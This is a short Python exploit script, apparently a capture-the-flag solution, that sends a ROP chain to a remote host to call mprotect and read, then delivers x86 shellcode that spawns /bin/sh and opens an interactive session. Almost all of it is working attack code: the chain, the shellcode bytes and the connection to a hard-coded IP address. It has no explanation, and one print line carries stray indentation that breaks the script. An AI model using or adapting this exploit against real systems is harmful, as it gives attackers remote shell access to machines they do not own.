import telnetlib
import time
from pwn import *  
 
POP3RET = 0x080485c9
MPROTECT = 0x8048370
READ = 0x8048380
 
payload = ""
payload += p32(0x080484de)        # leave;ret
payload += "A"*12               # junk
 
payload += p32(MPROTECT)          # mprotect 
payload += p32(POP3RET)           
payload += p32(0x30303030)        # @ of shellcode
payload += p32(0x1000)            # size 
payload += p32(0x7)               # PROT_READ|PROT_EXEC|PROT_WRITE
 
payload += p32(READ)              # read 
payload += p32(POP3RET)           
payload += p32(0x0)               # stdin
payload += p32(0x30303030)        # address of buff
payload += p32(1024)              # size
 
payload += p32(0x30303030)        # @ of shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('localhost',2323))
s.connect(('34.242.96.216',11111))
#first stage
print "[+] Sending first stage\n"
s.send(payload)
time.sleep(0.05)
 print "[+] Sending shellcode and spawning /bin/sh\n"
s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")
t = telnetlib.Telnet()
t.sock = s
t.interact()


